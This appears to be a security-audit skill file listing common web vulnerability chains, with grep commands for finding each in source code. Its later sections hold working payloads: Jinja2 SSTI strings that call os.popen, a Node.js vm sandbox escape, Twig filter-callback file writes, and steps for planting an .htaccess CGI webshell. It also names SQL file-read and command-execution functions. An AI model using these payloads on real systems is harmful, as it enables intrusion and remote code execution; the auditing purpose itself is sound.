---
name: common-chains
description: Common vulnerability chain patterns beyond SSRF, including auth bypass, SQLi escalation, and file-based attacks.
---

# Common Vulnerability Chains

Catalog of frequently observed vulnerability chains in modern web applications.

## Authentication/Authorization Chains

### Middleware Bypass → Protected Function → Impact

**Pattern:**
```
Path normalization bypass → Access admin endpoint → Exploit admin-only vuln
```

**Detection:**
```bash
# Find middleware
find . -name "middleware.ts" -o -name "*Middleware*.java" -o -name "*middleware*.py"

# Find protected routes
grep -rn "@admin\|@require_auth\|isAdmin\|checkAuth" --include="*.py" --include="*.ts" --include="*.java"

# Find path handling differences
grep -rn "normalize\|resolve\|join" --include="*.ts" --include="*.py"
```

### JWT None Algorithm → Forge Token → Privilege Escalation

**Pattern:**
```
Accept "none" algorithm → Forge admin JWT → Access admin functions
```

**Detection:**
```bash
# Find JWT verification
grep -rn "jwt\.verify\|decode\|Algorithm" --include="*.ts" --include="*.py" --include="*.java"

# Check for algorithm validation
grep -rn "algorithms\s*=" -A 3 --include="*.ts" --include="*.py"
```

## SQL Injection Chains

### SQLi → File Read → Source Code → Credentials

**Pattern:**
```
SQL injection → LOAD_FILE('/etc/passwd') → Read app config → Extract DB password
```

**Detection:**
```bash
# Find SQLi
grep -rn "execute\|query\|rawQuery" --include="*.py" --include="*.ts" | grep -E "\+|format|f\""

# Check DB type (file read capability)
grep -rn "mysql\|postgres\|mssql" package.json requirements.txt
```

**DB Capabilities:**
| Database | File Read | Command Exec |
|----------|-----------|--------------|
| MySQL | LOAD_FILE() | Via UDF |
| PostgreSQL | pg_read_file() | COPY TO PROGRAM |
| MSSQL | OPENROWSET | xp_cmdshell |
| SQLite | N/A | Via extension |

### SQLi → Write File → Webshell

**Pattern:**
```
SQL injection → SELECT INTO OUTFILE → Write PHP/JSP to webroot → RCE
```

**Detection:**
```bash
# Find webroot location
grep -rn "public\|static\|www\|htdocs" --include="*.conf" --include="*.yaml"
```

## File-Based Chains

### Path Traversal → Config Read → Credential Theft

**Pattern:**
```
../../../etc/passwd works → Read .env or config.yaml → Extract API keys/DB creds
```

**Detection:**
```bash
# Find file operations with user input
grep -rn "readFile\|open\|fopen" --include="*.ts" --include="*.py" --include="*.php" | grep -E "req\.|request\."

# Find sensitive files
find . -name "*.env*" -o -name "*config*.yaml" -o -name "*secret*"
```

### File Upload → Webshell

**Pattern:**
```
Upload with bypass → Store executable file → Access via web → RCE
```

**Detection:**
```bash
# Find upload handlers
grep -rn "upload\|multipart\|formidable\|multer" --include="*.ts" --include="*.py"

# Find extension validation
grep -rn "extension\|mimetype\|content-type" --include="*.ts" --include="*.py"
```

### LFI → Log Poisoning → RCE

**Pattern:**
```
Local file include → Inject code into log → Include log file → RCE
```

**Detection:**
```bash
# Find include/require with user input
grep -rn "include\|require\|include_once" --include="*.php" | grep -E "\$_"

# Find log file locations
grep -rn "LOG_PATH\|logfile\|access\.log\|error\.log" --include="*.php" --include="*.conf"
```

## Deserialization Chains

### Untrusted Deserialize → Gadget Chain → RCE

**Pattern:**
```
User-controlled serialized data → Deserialize without validation → Gadget triggers code exec
```

**Detection:**
```bash
# Python - find unsafe deserialization
grep -rn "loads\|load" --include="*.py" | grep -E "marshal|yaml\.load"

# Java
grep -rn "ObjectInputStream\|readObject\|XMLDecoder" --include="*.java"

# PHP
grep -rn "unserialize\|__wakeup\|__destruct" --include="*.php"

# Ruby
grep -rn "Marshal\.load\|YAML\.load" --include="*.rb"

# Node.js
grep -rn "node-serialize\|serialize-javascript" package.json
```

## Template Injection Chains

### User Input → Template → SSTI → RCE

**Pattern:**
```
User input in template context → Template engine evaluates → Code execution
```

**Detection by framework:**
```bash
# Jinja2 (Python)
grep -rn "render_template_string\|Template\(" --include="*.py"

# Twig (PHP)
grep -rn "createTemplate\|loadTemplate" --include="*.php"

# Freemarker (Java)
grep -rn "Template\|process\(" --include="*.java"

# EJS (Node.js)
grep -rn "ejs\.render\|<%=" --include="*.js" --include="*.ts"
```

## Multi-Tenant Chains

### Tenant Isolation Bypass → Cross-Tenant Data Access

**Pattern:**
```
IDOR in tenant ID → Access other tenant's data → Privilege escalation
```

**Detection:**
```bash
# Find tenant ID usage
grep -rn "tenant_id\|tenantId\|organization_id\|orgId" --include="*.py" --include="*.ts"

# Check enforcement
grep -rn "WHERE.*tenant\|filter.*tenant" --include="*.py" --include="*.ts"
```

## Chain Severity Matrix

| Entry Point | Pivot | Sink | Severity |
|-------------|-------|------|----------|
| SSRF | Internal service | RCE | CRITICAL |
| Auth bypass | Admin panel | SQLi | CRITICAL |
| SQLi | File read | Credentials | HIGH |
| Path traversal | Config | API keys | HIGH |
| XSS | Session | Account takeover | HIGH |
| IDOR | Other tenant | Data breach | HIGH |

## File-Write to CGI Chains (NEW)

### SSTI → file_put_contents → .htaccess → CGI RCE

**Pattern:**
```
SSTI in Twig → file_put_contents via filter → Write .htaccess with CGI config → Write shell script → Access via web → RCE
```

**When to use:** PHP disable_functions blocks shell commands but file_put_contents is available.

**Attack Steps:**
```
1. Confirm SSTI: {{7*7}} → 49
2. Confirm file write: {{['/www/public/test.txt','test']|sort('file_put_contents')}}
3. Write PHP dropper (decodes base64 shell script)
4. Write .htaccess: Options +ExecCGI\nAddHandler cgi-script .sh
5. Access shell script via web
```

**Detection:**
```bash
# Find Twig createTemplate
grep -rn "createTemplate\|->render(" --include="*.php"

# Check Apache AllowOverride
grep -rn "AllowOverride\|Options" --include="*.conf" --include="httpd.conf"

# Check disable_functions
grep -rn "disable_functions" --include="php.ini"
```

### Template Filter → Arbitrary PHP Function Chain

**Pattern:**
```
Twig SSTI → sort/map/filter callback → PHP function invocation
```

**Key Insight:** Twig's `sort`, `map`, `filter`, `reduce` accept PHP function names as callbacks.

**Examples:**
```twig
{{['/']|map('scandir')}}                    → calls scandir('/')
{{['/path','/dst']|sort('copy')}}           → calls copy('/path','/dst')
{{['/file','content']|sort('file_put_contents')}}  → writes file
```

**Detection:**
```bash
# Any SSTI with Twig should check for filter callbacks
grep -rn "createTemplate" --include="*.php"
```

## Sandbox Escape Chains (NEW)

### Python SSTI → MRO Chain → os.popen → RCE

**Pattern:**
```
Jinja2 SSTI → Access __mro__ → Find dangerous class → Access __globals__ → os module → popen
```

**Detection:**
```bash
grep -rn "render_template_string\|Template(" --include="*.py"
```

**Key Payloads:**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

### Node.js vm Escape → process → RCE

**Pattern:**
```
Code in vm context → Access constructor chain → Return process → require child_process → RCE
```

**Key Payload:**
```javascript
this.constructor.constructor('return process')().mainModule.require('child_process').spawnSync('id')
```

**Detection:**
```bash
grep -rn "vm\.run\|vm\.createContext" --include="*.js" --include="*.ts"
```

### Prototype Pollution → Spawn Options → RCE

**Pattern:**
```
Object merge with user input → Pollute Object.prototype → Trigger spawn with polluted options → RCE
```

**Detection:**
```bash
grep -rn "Object\.assign\|\.merge\|deepmerge" --include="*.js"
grep -rn "__proto__" --include="*.js"
```

## Updated Chain Severity Matrix

| Entry Point | Pivot | Sink | Severity |
|-------------|-------|------|----------|
| SSRF | Internal service | RCE | CRITICAL |
| SSTI + file write | .htaccess CGI | RCE | CRITICAL |
| Auth bypass | Admin panel | SQLi | CRITICAL |
| Twig filter callback | file_put_contents | File write | CRITICAL |
| Prototype pollution | spawn options | RCE | CRITICAL |
| vm sandbox | constructor chain | RCE | CRITICAL |
| SQLi | File read | Credentials | HIGH |
| Path traversal | Config | API keys | HIGH |
| XSS | Session | Account takeover | HIGH |
| IDOR | Other tenant | Data breach | HIGH |

## Detection Priority

When auditing, prioritize finding:
1. **SSRF** - Most versatile pivot
2. **Deserialization** - Direct to RCE
3. **SSTI** - Direct to RCE, check for filter callbacks and file-write chains
4. **SQLi** - Data breach + potential RCE
5. **Auth bypass** - Enables access to more attack surface
6. **Prototype pollution** - Often leads to RCE in Node.js
7. **vm/sandbox usage** - Almost always escapable
